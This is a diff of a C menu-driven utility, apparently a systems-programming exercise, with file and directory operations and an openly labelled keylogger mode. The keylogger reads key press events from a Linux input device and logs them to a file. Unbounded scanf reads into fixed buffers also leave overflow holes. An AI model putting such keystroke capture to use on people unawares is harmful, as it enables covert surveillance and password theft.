@@ -8,84 +8,129 @@
 #include <dirent.h>
 #include <time.h>
 #include <termios.h>
+#include <linux/input.h> // Required for input_event struct
+#include <signal.h>
+
+// Constants
+#define MAX_BUFFER_SIZE 1024
+#define DEFAULT_FILE_PERMS 0644
+#define DEFAULT_DIR_PERMS 0755
+#define DEVICE_PATH "/dev/input/event2" // Adjust this to your keyboard's device path
+
+// Global Variables
+int running = 1;
 
 // Function declarations
-void menu_system();
-void file_operations(int mode, char *arg1, char *arg2);
-void directory_operations(int mode, char *arg1);
-void keylogger_operations(char *logfile);
-void print_menu();
+void runMenuSystem(void);
+void handleFileOperations(int operationType, const char* primaryArg, const char* secondaryArg);
+void handleDirectoryOperations(int operationType, const char* dirPath);
+void startKeylogger(const char* logfile);
+void displayMainMenu(void);
+void sigint_handler(int sig);
 
-int main(int argc, char *argv[]) {
+typedef enum {
+    FILE_CREATE = 1,
+    FILE_CHANGE_PERMISSION,
+    FILE_READ,
+    FILE_WRITE,
+    FILE_DELETE
+} FileOperationType;
+
+typedef enum {
+    DIR_CREATE = 1,
+    DIR_REMOVE,
+    DIR_PRINT_CURRENT,
+    DIR_LIST
+} DirectoryOperationType;
+
+int main(int argc, char* argv[]) {
     if (argc == 1) {
-        // Menu-based operation
-        menu_system();
-    } else {
-        // Command-line arguments
-        if (strcmp(argv[1], "-m") == 0) {
-            int mode = atoi(argv[2]); // Mode (1: File, 2: Directory, 3: Keylogger)
-            switch (mode) {
-                case 1:
-                    file_operations(atoi(argv[3]), argv[4], argv[5]);
-                    break;
-                case 2:
-                    directory_operations(atoi(argv[3]), argv[4]);
-                    break;
-                case 3:
-                    keylogger_operations(argv[3]);
-                    break;
-                default:
-                    printf("Invalid mode selected!\n");
-            }
-        } else {
-            printf("Invalid arguments. Use the following format:\n");
-            printf("./supercommand -m <mode> <operation> <args>\n");
-        }
+        runMenuSystem();
+        return 0;
     }
+
+    if (strcmp(argv[1], "-m") != 0) {
+        printf("Invalid arguments. Use the following format:\n");
+        printf("./supercommand -m <mode> <operation> <args>\n");
+        return 1;
+    }
+
+    int mode = atoi(argv[2]);
+    switch (mode) {
+        case 1:
+            handleFileOperations(atoi(argv[3]), argv[4], argv[5]);
+            break;
+        case 2:
+            handleDirectoryOperations(atoi(argv[3]), argv[4]);
+            break;
+        case 3:
+            startKeylogger(argv[3]);
+            break;
+        default:
+            printf("Invalid mode selected!\n");
+            return 1;
+    }
+
     return 0;
 }
 
-// Menu-based operations
-void menu_system() {
+void runMenuSystem(void) {
     int choice;
+    char primaryArg[MAX_BUFFER_SIZE];
+    char secondaryArg[MAX_BUFFER_SIZE];
+
     while (1) {
-        print_menu();
+        displayMainMenu();
         printf("Enter your choice: ");
-        scanf("%d", &choice);
+        if (scanf("%d", &choice) != 1) {
+            while (getchar() != '\n'); // Clear input buffer
+            printf("Invalid input! Please enter a number.\n");
+            continue;
+        }
+
         switch (choice) {
             case 1: {
-                int sub_choice;
-                char arg1[100], arg2[100];
-                printf("File Operations:\n1. Create File\n2. Change Permission\n3. Read File\n4. Write File\n5. Delete File\n");
+                int subChoice;
+                printf("File Operations:\n"
+                       "1. Create File\n"
+                       "2. Change Permission\n"
+                       "3. Read File\n"
+                       "4. Write File\n"
+                       "5. Delete File\n");
                 printf("Enter your choice: ");
-                scanf("%d", &sub_choice);
+                scanf("%d", &subChoice);
                 printf("Enter file name (and path if required): ");
-                scanf("%s", arg1);
-                if (sub_choice == 2) {
+                scanf("%s", primaryArg);
+
+                if (subChoice == FILE_CHANGE_PERMISSION) {
                     printf("Enter permission (e.g., 0644): ");
-                    scanf("%s", arg2);
+                    scanf("%s", secondaryArg);
                 }
-                file_operations(sub_choice, arg1, sub_choice == 2 ? arg2 : NULL);
+                handleFileOperations(subChoice, primaryArg,
+                                     subChoice == FILE_CHANGE_PERMISSION ? secondaryArg : NULL);
                 break;
             }
             case 2: {
-                int sub_choice;
-                char arg1[100];
-                printf("Directory Operations:\n1. Create Directory\n2. Remove Directory\n3. Print Current Directory\n4. List Directory\n");
+                int subChoice;
+                printf("Directory Operations:\n"
+                       "1. Create Directory\n"
+                       "2. Remove Directory\n"
+                       "3. Print Current Directory\n"
+                       "4. List Directory\n");
                 printf("Enter your choice: ");
-                scanf("%d", &sub_choice);
-                if (sub_choice <= 2) {
+                scanf("%d", &subChoice);
+
+                if (subChoice <= DIR_REMOVE) {
                     printf("Enter directory name (and path if required): ");
-                    scanf("%s", arg1);
+                    scanf("%s", primaryArg);
                 }
-                directory_operations(sub_choice, sub_choice <= 2 ? arg1 : NULL);
+                handleDirectoryOperations(subChoice, subChoice <= DIR_REMOVE ? primaryArg : NULL);
                 break;
             }
             case 3: {
-                char logfile[100];
                 printf("Keylogger Operations:\nEnter log file name (e.g., keylog.txt): ");
-                scanf("%s", logfile);
-                keylogger_operations(logfile);
+                scanf("%s", primaryArg);
+                startKeylogger(primaryArg);
                 break;
             }
             case 0:
@@ -97,142 +142,184 @@ void menu_system() {
     }
 }
 
-// File operations
-void file_operations(int mode, char *arg1, char *arg2) {
-    int fd;
-    switch (mode) {
-        case 1: // Create/Open file
-            fd = open(arg1, O_CREAT | O_WRONLY, 0644);
-            if (fd == -1) perror("Error creating/opening file");
-            else printf("File %s created/opened successfully.\n", arg1);
-            close(fd);
+void handleFileOperations(int operationType, const char* primaryArg, const char* secondaryArg) {
+    int fileDescriptor;
+
+    switch (operationType) {
+        case FILE_CREATE:
+            fileDescriptor = open(primaryArg, O_CREAT | O_WRONLY, DEFAULT_FILE_PERMS);
+            if (fileDescriptor == -1) {
+                perror("Error creating/opening file");
+                return;
+            }
+            printf("File %s created/opened successfully.\n", primaryArg);
+            close(fileDescriptor);
             break;
-        case 2: // Change file permissions
-            if (chmod(arg1, strtol(arg2, NULL, 8)) == -1)
+
+        case FILE_CHANGE_PERMISSION: {
+            mode_t newPerms = strtol(secondaryArg, NULL, 8);
+            if (chmod(primaryArg, newPerms) == -1) {
                 perror("Error changing file permissions");
-            else
-                printf("Permissions of file %s changed to %s.\n", arg1, arg2);
+                return;
+            }
+            printf("Permissions of file %s changed to %s.\n", primaryArg, secondaryArg);
             break;
-        case 3: // Read file
-            fd = open(arg1, O_RDONLY);
-            if (fd == -1) perror("Error opening file for reading");
-            else {
-                char buffer[1024];
-                ssize_t bytes;
-                while ((bytes = read(fd, buffer, sizeof(buffer))) > 0) {
-                    write(STDOUT_FILENO, buffer, bytes);
+        }
+
+        case FILE_READ:
+            fileDescriptor = open(primaryArg, O_RDONLY);
+            if (fileDescriptor == -1) {
+                perror("Error opening file for reading");
+                return;
+            }
+            {
+                char buffer[MAX_BUFFER_SIZE];
+                ssize_t bytesRead;
+                while ((bytesRead = read(fileDescriptor, buffer, sizeof(buffer))) > 0) {
+                    write(STDOUT_FILENO, buffer, bytesRead);
                 }
                 printf("\n");
+                close(fileDescriptor);
             }
-            close(fd);
             break;
-        case 4: // Write to file
-            fd = open(arg1, O_WRONLY | O_APPEND);
-            if (fd == -1) perror("Error opening file for writing");
-            else {
+
+        case FILE_WRITE:
+            fileDescriptor = open(primaryArg, O_WRONLY | O_APPEND);
+            if (fileDescriptor == -1) {
+                perror("Error opening file for writing");
+                return;
+            }
+            {
+                char buffer[MAX_BUFFER_SIZE];
                 printf("Enter text to write to the file: ");
-                char buffer[1024];
                 scanf(" %[^\n]", buffer);
-                write(fd, buffer, strlen(buffer));
-                printf("Text written to file %s.\n", arg1);
+                write(fileDescriptor, buffer, strlen(buffer));
+                printf("Text written to file %s.\n", primaryArg);
+                close(fileDescriptor);
             }
-            close(fd);
             break;
-        case 5: // Delete file
-            if (unlink(arg1) == -1)
+
+        case FILE_DELETE:
+            if (unlink(primaryArg) == -1) {
                 perror("Error deleting file");
-            else
-                printf("File %s deleted successfully.\n", arg1);
+                return;
+            }
+            printf("File %s deleted successfully.\n", primaryArg);
             break;
+
         default:
             printf("Invalid file operation!\n");
     }
 }
 
-// Directory operations
-void directory_operations(int mode, char *arg1) {
-    switch (mode) {
-        case 1: // Create directory
-            if (mkdir(arg1, 0755) == -1)
+void handleDirectoryOperations(int operationType, const char* dirPath) {
+    switch (operationType) {
+        case DIR_CREATE:
+            if (mkdir(dirPath, DEFAULT_DIR_PERMS) == -1) {
                 perror("Error creating directory");
-            else
-                printf("Directory %s created successfully.\n", arg1);
-            break;
-        case 2: // Remove directory
-            if (rmdir(arg1) == -1)
-                perror("Error removing directory");
-            else
-                printf("Directory %s removed successfully.\n", arg1);
-            break;
-        case 3: { // Print current directory
-            char cwd[1024];
-            if (getcwd(cwd, sizeof(cwd)) != NULL)
-                printf("Current Directory: %s\n", cwd);
-            else
-                perror("Error getting current directory");
-            break;
-        }
-        case 4: { // List directory
-            DIR *dir;
-            struct dirent *entry;
-            if ((dir = opendir(arg1 ? arg1 : ".")) == NULL)
-                perror("Error opening directory");
-            else {
-                printf("Directory contents:\n");
-                while ((entry = readdir(dir)) != NULL) {
-                    printf("%s\n", entry->d_name);
-                }
-                closedir(dir);
+                return;
             }
+            printf("Directory %s created successfully.\n", dirPath);
+            break;
+
+        case DIR_REMOVE:
+            if (rmdir(dirPath) == -1) {
+                perror("Error removing directory");
+                return;
+            }
+            printf("Directory %s removed successfully.\n", dirPath);
+            break;
+
+        case DIR_PRINT_CURRENT: {
+            char currentPath[MAX_BUFFER_SIZE];
+            if (getcwd(currentPath, sizeof(currentPath)) == NULL) {
+                perror("Error getting current directory");
+                return;
+            }
+            printf("Current Directory: %s\n", currentPath);
             break;
         }
+
+        case DIR_LIST: {
+            DIR* dir = opendir(dirPath ? dirPath : ".");
+            if (dir == NULL) {
+                perror("Error opening directory");
+                return;
+            }
+
+            printf("Directory contents:\n");
+            struct dirent* entry;
+            while ((entry = readdir(dir)) != NULL) {
+                printf("%s\n", entry->d_name);
+            }
+            closedir(dir);
+            break;
+        }
+
         default:
             printf("Invalid directory operation!\n");
     }
 }
 
-// Keylogger operations
-void keylogger_operations(char *logfile) {
-    pid_t pid = fork();
-    if (pid == 0) { // Child process (keylogger)
-        int log_fd = open(logfile, O_CREAT | O_WRONLY | O_APPEND, 0644);
-        if (log_fd == -1) {
-            perror("Error opening log file");
-            exit(1);
-        }
+void startKeylogger(const char* logfile) {
+    struct input_event ev;
+    int fd, logfd;
+    char timestamp[64];
+    time_t t;
+    struct tm* tm_info;
 
-        // Write timestamp to log file
-        time_t t = time(NULL);
-        dprintf(log_fd, "Session started: %s\n", ctime(&t));
-
-        // Disable terminal echoing
-        struct termios oldt, newt;
-        tcgetattr(STDIN_FILENO, &oldt);
-        newt = oldt;
-        newt.c_lflag &= ~(ECHO | ICANON); // Disable echo and canonical mode
-        tcsetattr(STDIN_FILENO, TCSANOW, &newt);
-
-        char ch;
-        while (1) {
-            read(STDIN_FILENO, &ch, 1); // Capture keystrokes
-            if (ch == '\n') write(log_fd, "\n", 1);
-            else write(log_fd, &ch, 1);
-        }
-
-        // Restore terminal settings
-        tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
-        close(log_fd);
-        exit(0);
-    } else {
-        printf("Keylogger is running in the background. Log file: %s\n", logfile);
+    // Open the input device for reading
+    fd = open(DEVICE_PATH, O_RDONLY);
+    if (fd == -1) {
+        perror("Failed to open input device");
+        return;
     }
+
+    // Open the log file for writing
+    logfd = open(logfile, O_CREAT | O_WRONLY | O_APPEND, DEFAULT_FILE_PERMS);
+    if (logfd == -1) {
+        perror("Failed to open log file");
+        close(fd);
+        return;
+    }
+
+    // Write session start timestamp to the log file
+    t = time(NULL);
+    tm_info = localtime(&t);
+    strftime(timestamp, sizeof(timestamp), "Session started: %Y-%m-%d %H:%M:%S\n", tm_info);
+    write(logfd, timestamp, strlen(timestamp));
+
+    printf("Keylogger started. Logging keystrokes to %s\n", logfile);
+
+    // Set up signal handling for graceful termination
+    signal(SIGINT, sigint_handler);
+
+    while (running) {
+        // Read input events
+        ssize_t bytesRead = read(fd, &ev, sizeof(ev));
+        if (bytesRead == sizeof(ev)) {
+            if (ev.type == EV_KEY && ev.value == 1) { // Key press event
+                char keyInfo[64];
+                snprintf(keyInfo, sizeof(keyInfo), "Key %d pressed\n", ev.code);
+                write(logfd, keyInfo, strlen(keyInfo));
+            }
+        }
+    }
+
+    // Clean up resources
+    close(fd);
+    close(logfd);
+    printf("Keylogger stopped.\n");
 }
 
-// Print the menu
-void print_menu() {
-    printf("\nMain Menu:\n");
-    printf("1. File Operations\n");
-    printf("2. Directory Operations\n");
-    printf("3. Keylogger\n");
-    printf("0. Exit\n");
+void sigint_handler(int sig) {
+    running = 0;
+}
+
+void displayMainMenu(void) {
+    printf("\nMain Menu:\n"
+           "1. File Operations\n"
+           "2. Directory Operations\n"
+           "3. Keylogger\n"
+           "0. Exit\n");
 }
